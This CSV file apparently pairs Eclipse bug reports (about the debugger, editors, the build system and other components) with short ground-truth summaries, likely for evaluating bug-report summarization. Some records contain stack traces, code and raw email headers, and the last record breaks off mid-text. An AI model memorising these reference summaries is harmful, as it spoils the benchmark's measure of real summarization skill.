bug.id,bug_report,ground_truth_summary
6,Bump  maven-war-plugin version to 2.4 in org.eclipse.m2e.editor.xml/plugin.xml,Update maven-war-plugin template to 2.4
99,"The name of the feature for the SDK reads ""Eclipse Project SDK"" which is rather weird when shown in presence of the ""Eclipse SDK"" product like for example in the About > Installed Software dialog",SDK feature needs a better name
196,Build Identifier: 20100617-1415  Missing type arguments on org.eclipse.pde.internal.build.publisher  Reproducible: Always,Missing type arguments on org.eclipse.pde.internal.build.publisher
250,"I20070904-0800  On line 853 and 856 in TemplatePreferencePage two strings are compared with the string function compareToIgnoreCase to sort a table.  1. Why should one want to ignore the case when sorting, I've never seen that anywhere else? 2. Why not use Collator?      * Note that this method does <em>not</em> take locale into account,      * and will result in an unsatisfactory ordering for certain locales.      * The java.text package provides <em>collators</em> to allow      * locale-sensitive ordering.       Probably got missed when fixing bug 157093",[implementation] TemplatePreferencePage does compareToIgnoreCase
273,"There is one build path warning in the platform.ui workspace: org.eclipse.ui.examples.adapterservice uses JRE 6 for compliance level and build path.  Every other project uses JRE 8 for BREE, compliance level and classpath, therefore this one should use 8, too.",[examples] org.eclipse.ui.examples.adapterservice requires JRE 6
312,"The usage of    <if cond="""">   </if> is not mentioned in the reference.",Document conditional components
397,These lines in .handleKey are not easy to understand  ignore = (event.stateMask ^ SWT.ALT) == 0 || 		(event.stateMask ^ SWT.CTRL) == 0 || 		(event.stateMask ^ (SWT.ALT | SWT.SHIFT)) == 0 || 		(event.stateMask ^ (SWT.CTRL | SWT.SHIFT)) == 0;,[StyledText] Simplify boolean expression
428,"In the wizard page, the arrows are denoted by <-- and -->, which are not looking good. Also the UI guide lines hints on using only < and > See: http://wiki.eclipse.org/User_Interface_Guidelines#Multiple_Item_Selection  Now Platform UI has a similar widget Configure Columns dialog ( Problems View-> Columns... ) We use < and >. It would be good if PDE switches to this format to have consistency in SDK",The arrows in the Import plug-ins and fragments wizard page could be changed
505,20021105  Perform a scrapbook launch. Notice in Run/Debug drop downs there is entry like: Scrap.jpage-Scrapbook-1037204315937,Scrapbook launches showing up in history
516,Breakpoints that are set in anonymous inner classes that are contained in inner  classes are not hit.  Breakpoints in inner classes that are contained in inner  classes ARE hit,Breakpoints in an InnerClass anonymous inner classes are not hit
579,"Build ID: I20070525-1350  Steps To Reproduce: 1. create jsp, jspx, jsf and jspf files with tag, that contributes variable to EL. For example: <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <html><body> <f:view> <h:dataTable var=""c""> <h:column> <h:outputText value=""#{c}"" /> </h:column> </h:dataTable> </f:view> </body></html>  2. call content assist for EL expression in created files. In that case h:outputText in each of the created files. Variable will be present in jsp/jspx files, and for jsf/jspf it won't be.   More information: Reproduced in WTP2.0 RC1  As far as i see, it can be fixed be widening list of possible content types, for which EL variable contribution is performed: ""org.eclipse.jst.jsp.core.jspsource"" || ""org.eclipse.jst.jsp.core.jspfragmentsource"" instead of only ""org.eclipse.jst.jsp.core.jspsource"".",JSF html/core tags doesn't contribute variables to EL in file with JSP-fragment content type
626,"At startup the VariableContextManager is created and it starts listening to  the ""world"" so that it can maintain a currently selected resource.  It appears that this is unnecessary...the VariableContextManager could resolve  the selection when it is needed, that is in  VariableContextManager#getVariableContext()",VariableContextManager and ExternalToolsPlugin#startup
733,build R2.1  Every time I type a character all visible squiggly line annotations are  rendered. Since the AnnotationPainter already checks whether an annotation is visible it  seems reasonable to check whether it is affected by a redraw request. Noticed this while researching bug 32571.,[painting] Annotations rendered when not necessary
852,Code:  package bugfinder;  import java.util.Calendar;  public class StaticInit { 	static { 		Calendar.getInstance(); 	} }   Actions: - Position yourself between stance() and ; - Press Ctrl+1 - Select Assign statement to new field ... nothing happens,'Assign statement to new field' quick fix does not work in static initializer
866,You can no longer select <None> connection when the project's connection is already set in the JPA properties page.,Unable to disable DB Connection in the JPA properties page
905,"When using the File... Import... You cannot type into the ""Directory"" entry  filed.  You can only use the browser button to navigate to it.  You should be  alowed to type into it as well.",File... Import... File system does not allow typing into the directory entry field
1087,GCC Builtin specs Detector in Preferences gets always wrench overlay after collecting entries. It is not intended behavior which is to show overlay after options changed. Entries have no bearing on that.,GCC Builtin Compiler Settings always shows wrench overlay
1109,"If I create an about.ini file with an aboutText entry containing information about my feature, any http url such as http://www.eclipse.org is converted to an underlined hyperlink that can be followed.   https urls (such as https://www.paypal.com) on the other hand remain as text and can't be followed.",[About] https not converted to hyperlink in About Eclipse SDK Features
1182,"Created attachment 123228 Sample report for ""Wrong row counting makes unwanted page break when hiding a nested table content""  Build ID: M20080911-1700  Steps To Reproduce: 1. Create two data sets with some connecting fields, outer join is a must. 2. Create the outer table for the parent dataset. 3. In the detail section merge the cells into a big one. 4. Place here the inner table and some fields from the child data set. 5. In the inner table's binding property set the dependence (with parameter) on the outer table 6. Set the padding on the containing cell (outer table) to 0 at Top and Bottom. 7. Run the report with Birt Preview or PDF output.   More information: If the data sets have enough rows and there is enough empty child rows, unwanted page breaks appear in the output. I made some discussion on the problem through newsgroups, where I attached the sample report with data sets based on the sample database. (http://www.eclipse.org/newsportal/article.php?id=31944&group=eclipse.birt#31944). I attach here too this sample report. I think the reason is around the row (space) counting which tells if a page break is needed.  And I have got a wish too. I would like to make aggregation in the outer table based on the inner table. Presently I'm able to do this with scripting but I can show it (them) only in the footer of the outer table. We made reports with other tool the way they got a parameter to show only summaries or details too. We only hid or show the detail rows because the header of the outer group contained the aggregated values.  Thanks for your efforts, Attila",Wrong row counting makes unwanted page break when hiding a nested table content
1227,1. WARNING in /Eclipse RCP Tests/org/eclipse/ui/tests/rcp/WorkbenchWindowConfigurerTest.java  (at line 189) ActionBarAdvisor advisor = new ActionBarAdvisor(configurer) { The local variable advisor is never read  1. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 38) import org.eclipse.jface.dialogs.Dialog; The import org.eclipse.jface.dialogs.Dialog is never used 2. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 46) import org.eclipse.jface.resource.ImageRegistry; The import org.eclipse.jface.resource.ImageRegistry is never used 3. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 47) import org.eclipse.jface.resource.JFaceResources; The import org.eclipse.jface.resource.JFaceResources is never used,Compiler warnings in I20070517-0010
1441,"I got the following NPE running the test suite:  !ENTRY org.eclipse.core.runtime 4 2 Aug 27, 2004 10:10:31.843 !MESSAGE An internal error occurred during: ""Debug"". !STACK 0 java.lang.NullPointerException 	at  org.eclipse.jdt.internal.debug.core.model.JDIDebugTarget.isOutOfSynch (JDIDebugTarget.java:733) 	at org.eclipse.jdt.internal.debug.ui.JDIModelPresentation.getText (JDIModelPresentation.java:234) 	at org.eclipse.debug.internal.ui.LazyModelPresentation.getText (LazyModelPresentation.java:101) 	at org.eclipse.debug.internal.ui.DelegatingModelPresentation.getText (DelegatingModelPresentation.java:158) 	at  org.eclipse.debug.internal.ui.views.DebugViewLabelDecorator$LabelJob.run (DebugViewLabelDecorator.java:326) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:66)  It looks like the UI was trying to render a debug target that was in the  process of terminating/cleaning up. The method JDIDebugTarget.removeAllThreads () does not obtain a lock on the thread list before clearing it, and thus,  anyone else building a thread iterator can get null entries - i.e. the list  can be in the process of being cleared while buiding the thread iterator.  To make the code more readable, I removed the gettor for #getThreadList().  The ""clear"" operation now obtains the lock on the thread list before clearing.",NPE running test suite
1456,"The Run... Dialog comes up far to big on most platforms.  1) setShellSize uses getShell().getDisplay().getBounds(); for maximum sizes.  This is not correct for multiple monitor case.  See Control.getMonitor().  2) In resize, calculations are being made for the size of tabs but there is no knowledge of how much spacing appears between the text and the image etc.  This calculation is quite meaningless.  You should rely on TabFolder.computeSize to give the correct answer.  3) getInitializeSize is returning a very large number which is not based on the contents of the dialog and is too big on many platforms.  I would just stick with the default provided by Window.  4) initializeBounds should call initializeSashForm before calling super.initializeBounds.  Otherwise, SashForm assumes that all children have the same weight and this throws off the value calculated by the super.  Having done this, there is no need to call ensureSelectionAreaWidth or resize (assuming the sash weights are calculated correctly - see point 5).  5) initializeSashForm should use computeSize to determine the optimal weights.  Call computeSize on the two children that are on the left and the right of the SashForm and use these as the weights.  This will give the ideal weighting.  private void initializeSashForm() { 	if (getSashForm() != null) { 		IDialogSettings settings = getDialogSettings(); 		int[] sashWeights; 		int w1, w2; 		w1 = fLaunchConfigurationSelectionArea.computeSize(SWT.DEFAULT, SWT.DEFALT).x; 		w2 = fLaunchConfigurationEditArea.computeSize(SWT.DEFAULT, SWT.DEFAULT).x; 		sashWeights = new int[] {w1, w2}; 		getSashForm().setWeights(sashWeights); 	}",Bad sizing in LaunchConfigurationsDialog
1489,20050525  see attached screenshot,lots of dots rendered in debug view
1569,"in i0625 (essentially 3.3)   I was running along and there was output going to a console.  At some point I noticed my CPU pegged at 100%.  I paused the target and look at the threads.  It appears the the Main thread was doing Thread [main] (Suspended)	 	ConsoleDocumentAdapter.getLineAtOffset(int) line: 202	 	StyledText.getPointAtOffset(int) line: 4711	 	StyledText.setCaretLocation() line: 6654	 	StyledText.scrollVertical(int, boolean) line: 6449	 	StyledText.setTopIndex(int) line: 8005	 	TextConsoleViewer$3.runInUIThread(IProgressMonitor) line: 116	 	UIJob$1.run() line: 94	 	RunnableLock.run() line: 35	 	UISynchronizer(Synchronizer).runAsyncMessages(boolean) line: 123	 	Display.runAsyncMessages(boolean) line: 3659	 	Display.readAndDispatch() line: 3296	 	Workbench.runEventLoop(Window$IExceptionHandler, Display) line: 2389	 	Workbench.runUI() line: 2353	 	Workbench.access$4(Workbench) line: 2219	 	Workbench$4.run() line: 466	 	Realm.runWithDefault(Realm, Runnable) line: 289	 	Workbench.createAndRunWorkbench(Display, WorkbenchAdvisor) line: 461	 	PlatformUI.createAndRunWorkbench(Display, WorkbenchAdvisor) line: 149	 	IDEApplication.start(IApplicationContext) line: 106	 	EclipseAppHandle.run(Object) line: 153	 	EclipseAppLauncher.runApplication(Object) line: 106	 	EclipseAppLauncher.start(Object) line: 76	 	EclipseStarter.run(Object) line: 363	 	EclipseStarter.run(String[], Runnable) line: 176	 	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]	 	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 64	 	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43	 	Method.invoke(Object, Object...) line: 615	 	Main.invokeFramework(String[], URL[]) line: 504	 	Main.basicRun(String[]) line: 443	 	Main.run(String[]) line: 1169	 	Main.main(String[]) line: 1144	  When I stepped through the top method left and right were 82 and offsets at 82 was greater than offset.  So we got a nice tight loop in the while().  Not sure how this happened but it seems like a problem and some boundary checks are needed.",infinite loop in console
1588,"3.5 M6  Each time the workbench updates the ""show in context"", JDT's adapter looks up source for the current stack frame. Source lookup can be postponed until the actual result of the ""show in"" is required (if the menu were actually shown).","updating ""show in context"" looks  up source agressively"
1598,"I20100629-0800  Plug-in Dependencies view: The ""Focus On..."" view toolbar button is on the left of the tool bar in Callees mode, but on the right in Callers mode.","Plug-in Dependencies view: Jumpy ""Focus On..."" toolbar button"
1610,See bug 330766.  Will provide a patch once the document is updated for 3.7.,Better navigation for sub-sections in 'What's new' document
1642,"4.3.0.I20130605-2000  With the ""Windows 7 Classic"" theme, view titles are not immediately redrawn when the view changes its busy state. I could not reproduce with an E4 theme.  Steps: - enable ""Always run in background"" - select ""Windows 7 Classic"" theme - restart - Open Type Hierarchy (Ctrl+Shift+H) - enter an often-used type, e.g. Serializable or Comparable (in reasonably small workspaces, you can also use Object)  => View title only goes italic when I move the mouse over the view tab folder. It also stays italic until long after the progress view shows that the job is done. Again, moving the mouse over the tab bar corrects the rendering.",Busy (italic) view title not redrawn promptly with Classic theme
1660,"Since Eclipse 3.0, AbstractTextEditor uses caret creating methods. createInsertCaret(), createOverwriteCaret(), createRawInsertModeCaret(). However, these methods do not set the font information for IME to carets. It caused that font and size of the composition string uses the OS default, not same as the StyledText.",[implementation] A bug of  the IME composition string font.
1710,"Created attachment 220067 stack trace  I get numerous reports of the attached NPE in my log; and, seemingly as a result, the context menu for every node on the Git Repositories tree contains only a single item: ""Paste Repository Path or URI"". Very frustrating - it's hard to get anything done at that point.  At least once, this NPE occurred when I changed the focus to the window displaying the Git Repository Exploring perspective.",NPE in AbstractSharedCommandHandler
1804,"There are two places in the detail formatter manager where errors are logged  and displayed to the user when a 'toString()' evaluation fails. Since the error  is displayed to the user, we do not need to log the errors. We currently do not  log ""thread not suspended errors"", but no errors need to be logged.  see #resolveFormatter & EvaluationListener#evaluationComplete  try { 	valueToString(result.getValue()); } catch (DebugException e) { 	if (e.getStatus().getCode() != IJavaThread.ERR_THREAD_NOT_SUSPENDED) { 		// don't log 'thread not suspended' errors 		JDIDebugUIPlugin.log(e); 	} 	fListener.detailComputed(fValue, e.getStatus().getMessage()); }",Unneccessary error logging from detail formatter manager
2153,"Hi,  I am having a problem controlling a package via the default UML2 Editor. The underlying call it makes is org.eclipse.emf.edit.ui.action.ControlAction hence submitting here.  I am using Eclipse 3.2.1, EMF 2.2.2 and UML2 2.0.2.  I have a sample model that I will attached that can be used to reproduce this bug. The model contains 2 packages (a & b). The package ""a"" contains a primitive type ""string"", the package ""b"" contains a class which has an attribute that has a type of ""string"" from package ""a"".  If I control package ""b"" the href appears fine for it's reference to primitive type in package ""a"", i.e. it refers to My.uml#..... If I then close the editor and reopen and decide to control package ""a"" and ensure ""b"" has been loaded, the href in controlled file holding package ""b"" doesn't get updated and later usage of the editor has lost this href value.  Occasionally it seems to work, if I don't close the editor in between the controlling steps.  I have also noticed that the same problem exists when uncontrolling and that if the resource is set for ""TrackingModification"" if on the occasions that it does work, the isModified flag isn't getting set.  Cheers.  Ronan",Controlling a package leaving model in an inconsistent state.
2168,"As part of accessibility testing for IBM, I've found a number of improvements that could be made to our docs. This also fits in nicely with the accessiblity theme for Galileo.",Documentation accessibility improvements
2286,AFAIK we cannot activate a target platform via the new generic editor extension.   Angelo and Mickael allowed to add code minining annotations which allows to trigger action. Maybe we can use this to allow activation of a target definition file via the generic editor?,[code mining] Allow to activate the target platform via the generic editor
2316,Created attachment 222403 toString patch  I'd like to see an implementation for toString() for XMLMemento that returns the XML content.  If acceptable I added an appropriate patch for this.,add toString method to XMLMemento
2342,"Add columns element in the simple-master-page to define the column count in the master page.  The columns has two properties:  1, count, defines the column count in the master page. The value should be a integer. The default value is 1 which means only one column in the master page. 2, gap, defines the spaces between the columns. The default value is 12pt.",Add columns in master page
2346,"Hi,  Currently, subsystem transition does not support the transition of requirements. This is one of enhancements that could be added to the add-on.   Regards",Enhancement of subsystem transition
2476,"I20090525-2000  We should show the hand pointer for single-click tables and trees (Quick Outline, Quick Type Hierarchy, Hyperlink popup, Breadcrumb popup, maybe more).  This would make it immediately clear that these items are effectively links that are already activated on single click. See also http://msdn.microsoft.com/en-us/library/bb545459.aspx#hand .",[navigate] Show hand pointer for single-click tables and trees
2540,"Build ID: 20090619-0625  Steps To Reproduce: Currently, the definition of the Navigator Content Extension via plugin.xml allows to specify the boolean attribute allowByDefault which controls if the contributed content is active by default. It makes sence to change the type of the attribute from boolean to core expression, which will allow to evaluate the default context and show content depending on it. This will ease the control of content and enhance the declarative configuration of CNF and NCEs.  More information:",[CommonNavigator] Add core expression to determine initial activation for NCE
2579,I'd like to have the possibility to make all suspended threads to continue with only few key clicks. I suggest adding new command to the Run-menu; Ctrl-F8  Resume All Threads. It's implementation should be mostly trivial.,Add new command to Run-menu; Resume All Threads
2583,"1. Debug a program to a breakpoint. 2. When the source appears, decide that it's not the right source.  Currently, there's no way to change the source lookup for a running launch. You can add source  for things that don't have it, but you can't change it if you decide that the source is wrong.  We should be able to allow this by listening to launch configuration changes and updating the  source lookup if the user changes it.",Add ability to change source lookup of a running launch
2724,"By default, JMerger uses the qualified name of the Java elements to match the nodes of the source and target tree.  It would be good if a rule in the marge rule files would allow a more generic approach (such as using a UUID in the javadoc).",JMerger: Enable user defined method to match the Java elements being merged
2805,"I am extending Dali with some additional tooling and am using the Dali models to get information about entities.  However, these classes are all marked as internal.  For instance: org.eclipse.jpa.core.internal.content.java.JavaPersistentType org.eclipse.jpa.core.internal.content.java.JpaCompilationUnit org.eclipse.jpa.core.internal.content.java.JavaPersistentAttribute org.eclipse.jpa.core.internal.IMappingKeys org.eclipse.jpa.core.internal.contnet.java.mappings.JavaId org.eclipse.jpa.core.internal.contnet.java.mappings.JavaBasic  Could these be made open?  I think that these models are a nice way for extenders to interface with entities, rather than having every extender write custom code to do this.   Here are two examples of how I am using the models:  // get the primary key field and return type for an entity public static ParameterContainer getPrimaryKeyParameter(JavaPersistentType entity) { 	List<JavaPersistentAttribute> atttributes = entity.getAttributes(); 	for (JavaPersistentAttribute jpAtt : atttributes) { 		String attributeType = jpAtt.getMappingKey(); 		if (attributeType.equals(IMappingKeys.ID_ATTRIBUTE_MAPPING_KEY))  			String attributeName = jpAtt.getAttribute().getName(); 			String attributeTypeName = jpAtt.getAttribute().resolvedTypeName(); 			return new ParameterContainer(attributeName, attributeTypeName); 		} 	} 	return null; }  // get the temporal type for an attribute public static MyTemporalType getTemporalTypeForAttribute(JavaPersistentType entity, String attributeName) { 	List<JavaPersistentAttribute> atttributes = entity.getAttributes(); 	for (JavaPersistentAttribute jpAtt : atttributes) { 		String attName = jpAtt.getAttribute().getName(); 		if (attName.equals(attributeName)) { 			String attributeType = jpAtt.getMappingKey(); 			if (attributeType.equals(IMappingKeys.ID_ATTRIBUTE_MAPPING_KEY)) { 				IJavaAttributeMapping mapping = jpAtt.getMapping(); 				TemporalType temporalType = ((JavaBasic) mapping).getTemporal(); 				if (mapping instanceof JavaId) { 					int temporalTypeValue = temporalType.getValue(); 					if (temporalTypeValue == TemporalType.NULL) { 						return MyTemporalType.NONE; 					} 					else if (temporalTypeValue == TemporalType.DATE) { 						return MyTemporalType.DATE; 					} 					if (temporalTypeValue == TemporalType.TIME) { 						return MyTemporalType.TIME; 					} 					if (temporalTypeValue == TemporalType.TIMESTAMP) { 						return MyTemporalType.TIMESTAMP; 					} 				} 			} 			else if (attributeType.equals(IMappingKeys.BASIC_ATTRIBUTE_MAPPING_KEY)) { 				IJavaAttributeMapping mapping = jpAtt.getMapping(); 				if (mapping instanceof JavaBasic) { 					TemporalType temporalType = ((JavaBasic) mapping).getTemporal(); 					int temporalTypeValue = temporalType.getValue(); 					if (temporalTypeValue == TemporalType.NULL) { 						return MyTemporalType.NONE; 					} 					else if (temporalTypeValue == TemporalType.DATE) { 						return MyTemporalType.DATE; 					} 					if (temporalTypeValue == TemporalType.TIME) { 						return MyTemporalType.TIME; 					} 					if (temporalTypeValue == TemporalType.TIMESTAMP) { 						return MyTemporalType.TIMESTAMP; 					} 				} 			} 		} 	} 	return MyTemporalType.NONE; }",Internal models should be made public (provisional)
2813,Bug 521487 added explicit native method to cache JavaVM pointer. A better option is to cache it in JNI_OnLoad.,[GTK] Automatically cache JVM pointer for callbacks
2864,"Follow-up to bug 283856 / bug 315416, which made help links like this work (note the missing release name in front of /topic):  http://help.eclipse.org/topic/org.eclipse.platform.doc.user/tasks/running_eclipse.htm  However, it's still a bit painful to create such a link, since the location you see as a user when browsing help looks like this:  http://help.eclipse.org/juno/index.jsp?topic=%2Forg.eclipse.platform.doc.user%2Ftasks%2Frunning_eclipse.htm  Could you add a rewrite rule that also makes this form work and inserts ""/juno"" in front of ""/index.jsp""?  http://help.eclipse.org/index.jsp?topic=%2Forg.eclipse.platform.doc.user%2Ftasks%2Frunning_eclipse.htm   Note: Currently, http://help.eclipse.org/index.jsp mangles the host name into  http://help.ehelp.eclipse.org/index.jsp",Redirect http://help.eclipse.org/index.jsp to http://help.eclipse.org/juno/
3050,"If long Task/Error messages are dispayed in the task view, it can be very  tedious to scroll through the view / shift table columns. A multiline view  component for the description, or an additional detail view (dialog window)  showing the content of a selected task line would help very much. The detail  view could be opened by double click or context menu.",[Tasks] Detail view for Task/Error list
3096,"The Lock.uiSafeAcquire() method that transactions use to acquire the editing domain lock ensure UI thread liveness by only performing timed waits to attempt to acquire the lock before invoking the heavy-weight Job-based mechanism for witing for the lock while allowing the platform UI's UISynchronizer to continue processing UI events.  Unfortunately, the UI thread is frequently interrupted by the UI platform when Display.syncExec() calls are made by any Eclipse plug-in.  These result in the timed waits being interrupted, which throws an InterruptedException that clients are forced to deal with.  The Lock should ignore interrupts during the timed wait phase of the uiSafeAcquire() method.  When uiSafeAcquire() branches to the regular acquire() method, then the latter should honour interrupt requests.  Likewise, the Job-blocking algorithm in the uiSafeAcquire().",UI Thread Interrupts interfere with Timed Transaction Waits
3282,Created attachment 179297 Project to reproduce the problem  Steps to reproduce: 1) Install the Android Eclipse Tooling from http://developer.android.com/sdk/index.html (I am using Android API version 8) 2) import the attached Project 3) open com.example.android.skeletonapp.SkeletonActivity and go to line 57 4) insert . --> wait ~4 sec  5) start typing set '-->' wait between 10 and 30 sec.  The next time it seems to be faster but it still takes up to 5 sec.  I think this issue is major or even critical as it makes Eclipse hardly usable in such scenarios.,Very slow code completion for larger completion lists
3316,"To reproduce:  1. Create a team job. 2. cd HUDSON_HOME/teams/TeamName/jobs/JobName 3. mkdir undeletable 4. chmod -x undeletable 5. cd ~ # or anywhere outside job folder 6. In Hudson, delete the job. The delete will throw an exception and say the job can't be deleted. The job still appears in view. 7. Restart Hudson. The job no longer appears in view, but it is still in teams.xml file and will still show up (as bad link) in team admin Jobs tab. The job folder exists with no config.xml.","If job folder can't be deleted, Delete Job removes config.xml but leaves job folder and job entry in teams.xml"
3398,"I20100224-2242  I don't have steps to reproduce, but with this build, I often see the suspended thread disappearing from the Debug view. Most of the time, the thread disappears about 20 seconds after I last interacted with debug (stepped, selected something in the Debug or Variables view). It happens while I am doing nothing and also while I'm navigating around in different editors.  I can recover the lost thread by toggling 'Java > Show System Threads' in the Debug view menu.",Suspended thread disappears from Debug view
3425,"From the test summary page,  http://download.eclipse.org/eclipse/downloads/drops4/I20140525-2000/testResults.php It appears many tests show up in the first column, no matter what platform they are in ... and many show up as ""did not run"" ... but from looking at ""build results"" directories directly on build machine ... seems everything is there.   My theory is I ""broke"" how the indexer works by removing some properties that I though were not being used, as part of bug 435671. (And if that's the case ... appears the properties were being used for multiple purposes, at one point ... but might impact how ""the test indexer"" operates.   The commit in question is  http://git.eclipse.org/c/platform/eclipse.platform.releng.aggregator.git/commit/?id=892857c79f11b6be9ec5dcbb27b912d35e0043f2  Just do defend myself :) I assume the actual ""platform.template.php"" was no longer used, since we removed the ""filters"" from the DL and test pages. The reason this came to my attention is it not only contained references to the ""checksum"" directory (that's its relation to bug 435671) and then I noticed is referred to the ""drop"" location as "".../drops/..."" instead of what we currently use "".../drops4/..."".   But, like I said ... could have been playing multiple roles (sigh).   I'll try ""reverting"" that one commit, and re-running ""test indexer"".","test summaries from 0525-2000 are ""mixed up"" (or missing)"
3426,"During promotion from build machine to downloads server, we change the names of files (such as, so they have ""4.6RC2"" in the name, instead of ""I20160519-1730"").   And, to complicate matters, we ""promote"" from my own ID (not e4Build) since e4Build does not have write access to ""downloads"". But the ""signatures"" are under ""e4Build"".   So much for automation! For RC2 I did a lot ""by hand"" switching ids as needed. Not fun.",Checksum files need to be resigned during promotion
3451,"The Ant editor does not release JARs that supply tasks used in the build script.  I have a custom ant task that I want to use in my build script. I compile it as  part of the script, package it into a jar, and then do a <taskdef> later on to  define the task and use it.  Once I use the Ant editor on the build script, I can not delete the JAR file as  the Eclipse Ant support still has it open. In order for Eclipse to release the  JAR, I need to restart Eclipse.  Please note that the JAR file isn't being used in Eclipse in any other way (ie  not part of the project build, or part of the External Task runner)  (This is similar to the bug #61689, but relates to the Ant Editor, not the Ant  runtime)",Ant editor locks jars supplying tasks
3697,"In the class org.eclipse.jdt.internal.corext.dom.ASTFlattener, the code in the method ""public boolean visit(EnumDeclaration node)"" seems to expect EnumConstantDeclarations, in the ""bodyDeclarations"" list, but enumeration constants are stored in ""enumConstants"" list.  NaiveASTFlattener works OK, though.",ASTFlattener does not serialize EnumConstantDeclarations [code manipulation]
3711,"using wtp2.0.1 20070830060235  create new xml editing and validating xml files examples project the project shows up twice in the project explorer  this doesnt happen in the navigator view this doesnt happen when i create a new web, java, simple project this doesnt happen when i create new gef example projects",[CommonNavigator] 2 xml example projects show up in project explorer
3745,"Neil:  I didn't notice this until now, but the new EMFT site doesn't link up the 1.0.0/0.7.0 NLpacks for the 5 projects released in June.  Paths to files on the servers are as follows:  download: /home/data/httpd/download.eclipse.org/technology/emft/downloads/NLS emf.toro: /var/www/technology/emft/downloads/NLS emft.eclipse: (not yet applicable)  There are two zips for each project, and only appear for OCL, Query, Transaction, Validation, and JET.  We should add a similar right-side box for NL packs as on EMF, but only have it appear for the 5 projects above. Also, while you're redoing the footer, we should probably rewrite the copy about ""using EMFT"" since by itself there's no such thing.",EMFT NLpacks are not available in new Phoenix skin
3799,"In the following code  int a = 100; c = a instanceof Object;  eclipse does not mark any error or something and produces a class file. The code is not runnable and produces a VerifierError because ""a"" is not an Object.  I used Build id: I20060413-1718 for this test",[1.5][compiler] instanceof accepts primitive type as left-hand-side
3858,"Take the following code:  	package nulla; 	 	import org.eclipse.jdt.annotation.NonNullByDefault; 	 	@NonNullByDefault 	public class NullaTest { 		 		 		Object foo() { 			return new Object(); 		} 		 		void bar() { 			o = foo(); 		} 		 	}  Invoke the quickfix 'create local variable o'. The resulting code will be:  			@NonNull 			Object o = foo();   The @NonNull annotation is not necessary, especially not for local variables.","[1.8][null] Quickfixes add unnecessary @NonNull annotation to types, when @NonNullByDefault is used"
3986,"I have been receiving emails from bugzilla both for myself (correct) and, oddly, incorrectly, emails addressed to Ward.  == == == == == == == == == == == == == == == == == == == ==  My bugzilla watch list is: phoenix.contentmgt-inbox@eclipse.org,phoenix.templates-inbox@eclipse.org,phoenix.ui-inbox@eclipse.org,dash.eclipsemonkey-inbox@eclipse.org,cross-project.inbox@eclipse.org  == == == == == == == == == == == == == == == == == == == ==  Here is a bugzilla email that was sent to me: From - Tue May 02 14:20:28 2006 X-Mozilla-Status: 0001 X-Mozilla-Status2: 00000000 Return-Path: <wwwrun@eclipse.org> X-Original-To: bjorn@foundation.eclipse.org Delivered-To: bjorn@foundation.eclipse.org Received: by foundation.eclipse.org (Postfix, from userid 102) 	id 820BD5D8; Tue,  2 May 2006 15:37:43 -0400 (EDT) X-Spam-Virus: No X-Spam-Checker-Version: SpamAssassin 3.1.0 (2005-09-13) on  	foundation.eclipse.org X-Spam-Level:  X-Spam-Status: No, score=-2.3 required=3.1 tests=AWL,BAYES_00 autolearn=ham  	version=3.1.0 Received: from mail.eclipse.org (eclipse.org [206.191.52.51]) 	by foundation.eclipse.org (Postfix) with ESMTP id CAF419DB 	for <bjorn@foundation.eclipse.org>; Tue,  2 May 2006 15:37:38 -0400 (EDT) Received: by mail.eclipse.org (Postfix) 	id 1FA582AD958; Tue,  2 May 2006 15:37:38 -0400 (EDT) Delivered-To: bjorn@eclipse.org Received: from build.eclipse.org (news.eclipse.org [206.191.52.34]) 	by mail.eclipse.org (Postfix) with ESMTP id 1BF3D2AD957 	for <bjorn@eclipse.org>; Tue,  2 May 2006 15:37:38 -0400 (EDT) Received: by build.eclipse.org (Postfix, from userid 30) 	id D18679A53A; Tue,  2 May 2006 15:37:38 -0400 (EDT) Subject: [Bug 118245] Allow bugzilla registered users to edit the wiki X-Bugzilla-Reason: Reporter In-Reply-To: <bug-118245-16161@https.bugs.eclipse.org/bugs/> To: bjorn@eclipse.org From: bugzilla-daemon@eclipse.org Message-Id: <20060502193738.D18679A53A@build.eclipse.org> Date: Tue,  2 May 2006 15:37:38 -0400 (EDT) X-Sanitizer: Eclipse.org anomy configuration  https://bugs.eclipse.org/bugs/show_bug.cgi?id=118245  Product/Component: Community / Wiki      ------- Comment #30 from webmaster@eclipse.org  2006-05-02 15:38 ------- Need to test what happens when a Bugzilla user has an underscore character in the username.  Seems Wiki maps it to a space (and back) but fails the authentication in the interim.    --  Configure bugzilla e-mail: https://bugs.eclipse.org/bugs/userprefs.cgi?tab=email ------- You are receiving this mail because: ------- You reported the bug, or are watching the reporter.  == == == == == == == == == == == == == == == == == == == ==  Note that the same email is sent to Ward but arrives in my inbox. Notice that there is *no* mention of ""bjorn"" anywhere in this email: From - Tue May 02 14:09:06 2006 X-Mozilla-Status: 0001 X-Mozilla-Status2: 00000000 Return-Path: <wwwrun@eclipse.org> X-Original-To: ward@foundation.eclipse.org Delivered-To: ward@foundation.eclipse.org Received: by foundation.eclipse.org (Postfix, from userid 102) 	id CAB079DB; Tue,  2 May 2006 15:37:44 -0400 (EDT) X-Spam-Virus: No X-Spam-Checker-Version: SpamAssassin 3.1.0 (2005-09-13) on  	foundation.eclipse.org X-Spam-Level:  X-Spam-Status: No, score=-2.3 required=3.1 tests=AWL,BAYES_00 autolearn=ham  	version=3.1.0 Received: from mail.eclipse.org (eclipse.org [206.191.52.51]) 	by foundation.eclipse.org (Postfix) with ESMTP id 5D579B66 	for <ward@foundation.eclipse.org>; Tue,  2 May 2006 15:37:39 -0400 (EDT) Received: by mail.eclipse.org (Postfix) 	id B0E512AD966; Tue,  2 May 2006 15:37:38 -0400 (EDT) Delivered-To: ward@eclipse.org Received: from build.eclipse.org (news.eclipse.org [206.191.52.34]) 	by mail.eclipse.org (Postfix) with ESMTP id AE2752AD956 	for <ward.cunningham@eclipse.org>; Tue,  2 May 2006 15:37:38 -0400 (EDT) Received: by build.eclipse.org (Postfix, from userid 30) 	id 6C23A9A53B; Tue,  2 May 2006 15:37:39 -0400 (EDT) Subject: 